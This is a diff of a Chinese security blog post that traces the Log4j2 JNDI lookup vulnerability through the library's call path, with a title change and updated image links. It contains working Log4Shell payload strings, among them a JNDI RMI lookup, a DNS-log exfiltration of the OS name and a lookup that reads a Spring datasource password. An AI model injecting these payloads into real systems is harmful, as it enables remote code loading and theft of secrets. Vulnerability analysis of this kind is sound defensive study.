@@ -16,43 +16,45 @@
   <meta name="author" content="3xsh0re">
   <meta name="keywords" content="">
   
-    <meta name="description" content="入门级Java反序列化漏洞😋很久之前分析过了，今天形成博客">
+    <meta name="description" content="很久之前分析过了，今天形成博客，顺带写了一个工具Demo">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Log4j2反序列化漏洞原理分析">
-<meta property="og:url" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="Log4j2解析漏洞原理分析">
+<meta property="og:url" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/index.html">
 <meta property="og:site_name" content="3xsh0re&#39;Blog">
-<meta property="og:description" content="入门级Java反序列化漏洞😋很久之前分析过了，今天形成博客">
+<meta property="og:description" content="很久之前分析过了，今天形成博客，顺带写了一个工具Demo">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103123177.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103609288.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105306091.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105456534.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110302291.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223506436.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110821531.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707235601603.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111850828.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111114357.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223343811.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708134537990.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708135153387.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230109954.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231739578.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231833038.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230247931.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707232102120.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230813761.png">
-<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708112758092.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103123177.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103609288.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105306091.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105456534.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110302291.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223506436.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110821531.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707235601603.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111850828.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111114357.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223343811.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708134537990.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708135153387.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230109954.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231739578.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231833038.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230247931.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707232102120.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230813761.png">
+<meta property="og:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708112758092.png">
 <meta property="article:published_time" content="2024-06-10T12:14:42.000Z">
-<meta property="article:modified_time" content="2024-07-16T01:15:12.934Z">
+<meta property="article:modified_time" content="2024-08-14T03:18:18.609Z">
 <meta property="article:author" content="3xsh0re">
+<meta property="article:tag" content="漏洞分析">
+<meta property="article:tag" content="Java安全">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png">
+<meta name="twitter:image" content="https://3xsh0re.github.io/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png">
   
   
   
-  <title>Log4j2反序列化漏洞原理分析 - 3xsh0re&#39;Blog</title>
+  <title>Log4j2解析漏洞原理分析 - 3xsh0re&#39;Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -371,7 +373,7 @@ mjx-container[display="true"] + br {
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Log4j2反序列化漏洞原理分析"></span>
+            <span id="subtitle" data-typed-text="Log4j2解析漏洞原理分析"></span>
           
         </div>
 
@@ -450,12 +452,12 @@ mjx-container[display="true"] + br {
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Log4j2反序列化漏洞原理分析</h1>
+            <h1 id="seo-header">Log4j2解析漏洞原理分析</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2024年7月16日 上午
+                    本文最后更新于：2024年8月14日 上午
                   
                 
               </p>
@@ -463,7 +465,7 @@ mjx-container[display="true"] + br {
             
               <div class="markdown-body">
                 
-                <p>入门级Java反序列化漏洞😋很久之前分析过了，今天形成博客</p>
+                <p>很久之前分析过了，今天形成博客，顺带写了一个工具Demo</p>
 <span id="more"></span>
 
 <h2 id="Log4j2漏洞原理分析"><a href="#Log4j2漏洞原理分析" class="headerlink" title="Log4j2漏洞原理分析"></a>Log4j2漏洞原理分析</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/fdxsec/p/17793755.html">参考文章</a></p>
@@ -487,69 +489,69 @@ mjx-container[display="true"] + br {
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> {<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> {<br>        <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> <span class="hljs-string">"${jndi:rmi://127.0.0.1/3xsh0re}"</span>;<br>        logger.error(<span class="hljs-string">"run {}"</span>,payload);<br>    }<br>}<br></code></pre></td></tr></table></figure>
 
 <h4 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h4><p>下面打断点调试漏洞路径：先打一个初始断点</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707233903961">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707233903961.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707233903961">
 
 <p>首先步进调试到下面的位置，发现在ReusableParameterizedMessage中调用了set函数，其实就是在初始化日志的格式</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103123177.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708103123177">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103123177.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708103123177">
 
 <p>可以发现这里初始化中的paramArray参数就是我们的payload</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103609288.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708103609288">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708103609288.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708103609288">
 
 <p>以上完成了初始化。</p>
 <p>ReusableLogEventFactory中createEvent函数（34行）进行了日志事件的初始化，也就是后面的event变量。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105306091.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708105306091">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105306091.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708105306091">
 
 <p>后面进入了LoggerConfig中的callAppender函数，然后这里的函数调用我就不贴图了：调用到AppenderControl中的tryCallAppender，然后调用AbstractOutputStreamAppender中的Append-&gt;tryAppend-&gt;directEncodeEvent。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105456534.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708105456534">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708105456534.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708105456534">
 
 <p>在这之后调用了PatternLayout中的encode函数，可以发现调用了toText函数，继续跟进</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110302291.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708110302291">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110302291.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708110302291">
 
 <p>进入PatternLayout的toText函数，然后调用了序列化函数</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223506436.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707223506436">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223506436.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707223506436">
 
 <p>在toSerializable函数中，调用format函数，并将当前event和待处理字符串传入</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110821531.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708110821531">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708110821531.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708110821531">
 
 <p>调试到PatternFormatter中的format函数发现此时在格式化需要打印的日志，可以发现在进行格式化的时候有两个参数，一个buf作为输出的缓冲。<strong>值得注意的是，这里调用了不同的converter的format函数。</strong></p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707235601603.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707235601603">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707235601603.png" srcset="/img/loading.gif" lazyload class="" title="image-20240707235601603">
 
 <p>比如处理日期：调用的是DatePatternConverter的format函数</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111850828.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708111850828">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111850828.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708111850828">
 
 <p>处理字符串，当前的format函数进而调用了LiteralPatternConverter中的format函数</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111114357.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708111114357">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708111114357.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708111114357">
 
 <p>继续调试，输入<code>${jndi:rmi://127.0.0.1/3xsh0re}</code>对应的是<code>%msg</code>，处理的converter是<code>MessagePatternConverter</code>，跟进它的format()。发现在MessagePatternConverter（第102行）中调用了另一个格式化方法，专门解析字符串<code>${}</code>，这里如果msg中存在<code>${</code>字符串，取出msg值后，就将整个msg字符串从<code>workingBuilder</code>中替换掉。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223343811.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707223343811.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>先触发了replace函数，这里如果source也就是我们的payload不为空的话，将会调用substitute函数。那么substitute函数是干什么的呢。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708134537990.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708134537990">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708134537990.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708134537990">
 
 <p>我们继续看StrSubstitutor中的substitute函数，这里调用了另一个返回值为int的重构函数，稍微看一段这段代码，可以发现这个函数实际上是在递归的解析<code>${}</code>，直到将被包括的内容取出来。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708135153387.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708135153387">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708135153387.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708135153387">
 
 <p>同样的，在这个substitute函数中，递归解析完成了，会调用resolveVariable (第418行)去触发了JndiLookup函数，加载字符串中的内容</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230109954.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230109954.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>这里调用了StrLookup的lookup函数</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231739578.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231739578.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>这是一个接口类，根据不同的事件去匹配不同的实现，这里实现了JndiLookup接口。其实这里可以发现支持了很多的Lookup函数，说明可以解析的参数还有很多。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//获取java运行时版本，jvm版本，和操作系统版本</span><br><span class="hljs-string">"${java:runtime} ${java:vm} ${java:os}"</span><br><span class="hljs-string">"${sys:java.version}"</span><br><br><span class="hljs-comment">//外带数据:</span><br><span class="hljs-string">"${jndi:ldap://${java:os}.dkfjlsd.dnslog.cn}"</span><br><br><span class="hljs-comment">//还可利用Bundle协议读取项目配置文件来获取敏感信息。</span><br><span class="hljs-string">"${bundle:application:spring.datasource.password}"</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231833038.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707231833038.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>这里调用JndiLookup中的convertJndiName去处理我们的路径，得到要加载类的地址</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230247931.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230247931.png" srcset="/img/loading.gif" lazyload class="">
 <p>然后调用了JndiManager</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707232102120.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707232102120.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>使用JndiManager的lookup函数，然后这个lookup函数最终调用了java原生的lookup函数，导致反序列化远程加载恶意类。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230813761.png" srcset="/img/loading.gif" lazyload class="">
+<img src="/2024/06/10/Log4j2%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240707230813761.png" srcset="/img/loading.gif" lazyload class="">
 
 <p>到此，低版本Java的分析完了。</p>
-<img src="/2024/06/10/Log4j2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/image-20240708112758092.png" srcset="/img/loading.gif" lazyload class="" title="image-20240708112758092">
